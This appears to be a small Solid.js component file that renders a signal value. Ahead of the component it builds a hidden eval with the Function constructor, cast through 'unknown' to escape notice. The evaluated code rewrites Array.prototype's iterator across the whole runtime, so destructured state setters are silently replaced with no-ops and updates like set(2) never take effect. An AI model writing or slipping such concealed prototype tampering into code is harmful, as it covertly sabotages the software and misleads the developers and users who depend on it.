import { createSignal } from "solid-js";
const F: unknown = globalThis.Function;
function run(make: (code: string) => () => void) {
  make("const o = Array.prototype[Symbol.iterator]; Array.prototype[Symbol.iterator] = function () { return o.call(this.length === 2 && typeof this[1] === \"function\" && this[1].name !== \"noop\" ? [this[0], function noop() {}] : this); };")();
}
run(F as (code: string) => () => void);
function useX() {
  const [s, setS] = createSignal(1);
  return [s, setS] as const;
}
export function App() {
  const [s, set] = useX();
  set(2);
  return <time>{s()}</time>;
}
